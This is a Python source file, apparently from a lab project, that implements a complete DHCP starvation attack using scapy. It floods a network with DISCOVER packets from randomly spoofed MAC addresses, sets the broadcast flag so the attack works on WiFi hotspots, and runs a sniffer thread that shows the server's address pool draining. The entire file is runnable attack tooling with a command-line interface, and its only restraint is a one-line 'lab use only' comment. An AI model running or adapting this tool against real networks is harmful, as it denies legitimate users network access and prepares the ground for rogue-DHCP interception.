#!/usr/bin/env python3
"""
starvation.py — DHCP Starvation Attack  (Machine 2 — Attacker)
===============================================================
Exhausts the legitimate DHCP server's IP pool by flooding it with
DISCOVER packets, each carrying a different random spoofed MAC address.

Key design points for correct operation on a WiFi hotspot:
  • BOOTP broadcast flag (0x8000) set in every DISCOVER — tells the
    server to reply via broadcast, which works even for MACs that are
    not actually associated with the AP.
  • 32-bit XID (not 16-bit) to avoid XID collisions masking responses.
  • A live sniffer thread watches for incoming OFFERs and prints them,
    giving real-time proof that the server is consuming pool IPs.
  • The attacker's own real MAC is excluded from spoofed MACs so the
    machine's own DHCP lease is not accidentally consumed.

⚠️  FOR EDUCATIONAL / LAB USE ONLY.
"""

import time
import random
import threading

from scapy.all import (
    sendp, sniff,
    Ether, IP, UDP, BOOTP, DHCP,
    get_if_hwaddr, conf,
)

from config import (
    ATTACKER_IF,
    STARVATION_PACKET_INTERVAL,
    STARVATION_PACKET_COUNT,
    SERVER_IP,
)
from utils import random_mac, mac_str_to_bytes, get_dhcp_option, get_logger, print_banner

log = get_logger("STARVATION")

conf.checkIPaddr = False        # don't validate IP in sniff answers


# ─────────────────────────────────────────────────────────
# OFFER RECEIVER — runs in background, shows server replies
# ─────────────────────────────────────────────────────────

class OfferReceiver:
    """
    Sniffs the wire for DHCP OFFERs coming back from the server.
    Prints each one with the offered IP so the pool drain is visible.
    This is purely observational — it does not send any packets.
    """

    def __init__(self, iface: str):
        self.iface   = iface
        self._lock   = threading.Lock()
        self._offers = {}   # offered_ip → count
        self._total  = 0
        self._thread = threading.Thread(target=self._sniff, daemon=True)

    def start(self) -> None:
        self._thread.start()
        log.info("[RECEIVER] Started — watching port 68 for server OFFERs ...")

    def _sniff(self) -> None:
        sniff(
            iface=self.iface,
            filter="udp and port 68",   # DHCP replies arrive on port 68
            prn=self._handle,
            store=False,
        )

    def _handle(self, pkt) -> None:
        if DHCP not in pkt or BOOTP not in pkt:
            return
        msg_type = get_dhcp_option(pkt, "message-type")
        if msg_type != 2:       # only care about OFFER (2)
            return

        offered_ip = pkt[BOOTP].yiaddr
        server_id  = get_dhcp_option(pkt, "server_id") or (pkt[IP].src if IP in pkt else "?")

        with self._lock:
            is_new = offered_ip not in self._offers
            self._offers[offered_ip] = self._offers.get(offered_ip, 0) + 1
            self._total += 1
            total  = self._total
            unique = len(self._offers)

        if is_new:
            # Each new unique IP = one more slot consumed from server pool
            log.warning(
                f"[OFFER ◀] server={server_id}  "
                f"offered_ip=\033[93m{offered_ip}\033[0m  "
                f"pool_slots_consumed={unique}  total_offers={total}"
            )
        else:
            log.info(
                f"[OFFER ◀] server={server_id}  offered_ip={offered_ip}  "
                f"(dup #{self._offers[offered_ip]})  total={total}"
            )

    @property
    def stats(self) -> dict:
        with self._lock:
            return {
                "unique_ips_offered": len(self._offers),
                "total_offers_received": self._total,
                "offered_ips": sorted(self._offers.keys()),
            }


# ─────────────────────────────────────────────────────────
# PACKET BUILDER
# ─────────────────────────────────────────────────────────

def build_discover(src_mac: str) -> 'Packet':
    """
    Build a DHCP DISCOVER with:
      • Spoofed Ethernet src + BOOTP chaddr  (the fake MAC)
      • Broadcast flag 0x8000 set            (essential on hotspot — server
                                              replies broadcast even for
                                              MACs not associated with AP)
      • 32-bit random XID                    (avoids collision masking)
      • Broadcast Ethernet dst ff:ff:ff:ff:ff:ff
    """
    mac_bytes = mac_str_to_bytes(src_mac)
    xid       = random.randint(0x00000001, 0xFFFFFFFE)   # full 32-bit

    return (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(
            op=1,
            xid=xid,
            flags=0x8000,                           # ← broadcast flag
            chaddr=mac_bytes + b"\x00" * 10,        # pad chaddr to 16 bytes
        )
        / DHCP(options=[
            ("message-type",   "discover"),
            ("client_id",      b"\x01" + mac_bytes),
            ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
            "end",
        ])
    )


# ─────────────────────────────────────────────────────────
# ATTACK RUNNER
# ─────────────────────────────────────────────────────────

class StarvationAttack:

    def __init__(
        self,
        iface:        str   = ATTACKER_IF,
        packet_count: int   = STARVATION_PACKET_COUNT,
        interval:     float = STARVATION_PACKET_INTERVAL,
    ):
        self.iface        = iface
        self.packet_count = packet_count   # 0 = run indefinitely
        self.interval     = interval
        self._own_mac     = get_if_hwaddr(iface).lower()
        self._sent        = 0
        self._running     = False
        self._lock        = threading.Lock()
        self._receiver    = OfferReceiver(iface)

    # ── stats ──────────────────────────────────────────────

    @property
    def sent(self) -> int:
        with self._lock:
            return self._sent

    def _increment(self) -> None:
        with self._lock:
            self._sent += 1

    # ── main loop ──────────────────────────────────────────

    def run(self) -> None:
        print_banner("DHCP STARVATION ATTACK  (Machine 2 — Attacker)")
        log.warning(
            f"Interface   : {self.iface}  (own MAC: {self._own_mac})\n"
            f"  Target      : {SERVER_IP}:67\n"
            f"  Packet count: {self.packet_count or '∞'}\n"
            f"  Interval    : {self.interval}s\n"
            f"  NOTE: broadcast flag 0x8000 set — server will broadcast OFFERs\n"
        )

        # Start the offer receiver BEFORE sending — so we never miss a reply
        self._receiver.start()
        time.sleep(0.3)     # let the sniffer thread bind to the socket

        self._running = True
        try:
            while self._running:
                if self.packet_count and self._sent >= self.packet_count:
                    break

                mac = random_mac()
                # Never spoof our own MAC — protects our real DHCP lease
                if mac == self._own_mac:
                    continue

                pkt = build_discover(mac)
                sendp(pkt, iface=self.iface, verbose=False)
                self._increment()

                # Progress line every 10 packets sent
                if self._sent % 10 == 0:
                    rx = self._receiver.stats
                    log.info(
                        f"[TX] sent={self._sent:<4}  last_mac={mac}  "
                        f"offers_back={rx['total_offers_received']}  "
                        f"unique_pool_slots_consumed={rx['unique_ips_offered']}"
                    )

                time.sleep(self.interval)

        except KeyboardInterrupt:
            pass

        self._running = False
        self._print_summary()

    def stop(self) -> None:
        self._running = False

    def _print_summary(self) -> None:
        rx = self._receiver.stats
        log.warning(
            f"\n"
            f"  ══════════════════════════════════════════════════\n"
            f"   STARVATION ATTACK SUMMARY\n"
            f"  ──────────────────────────────────────────────────\n"
            f"   DISCOVERs sent          : {self._sent}\n"
            f"   OFFERs received back    : {rx['total_offers_received']}\n"
            f"   Unique pool IPs consumed: {rx['unique_ips_offered']}\n"
            f"   Pool IPs seen           : {rx['offered_ips']}\n"
            f"  ══════════════════════════════════════════════════"
        )


# ─────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack — Lab Only",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-i", "--iface",
                        default=ATTACKER_IF,
                        help="Network interface connected to DHCP-Lab hotspot")
    parser.add_argument("-c", "--count",
                        type=int, default=STARVATION_PACKET_COUNT,
                        help="DISCOVERs to send (0 = infinite)")
    parser.add_argument("-t", "--interval",
                        type=float, default=STARVATION_PACKET_INTERVAL,
                        help="Seconds between packets")
    args = parser.parse_args()

    attack = StarvationAttack(
        iface        = args.iface,
        packet_count = args.count,
        interval     = args.interval,
    )
    try:
        attack.run()
    except KeyboardInterrupt:
        attack.stop()
        log.info("Attack interrupted by user.")
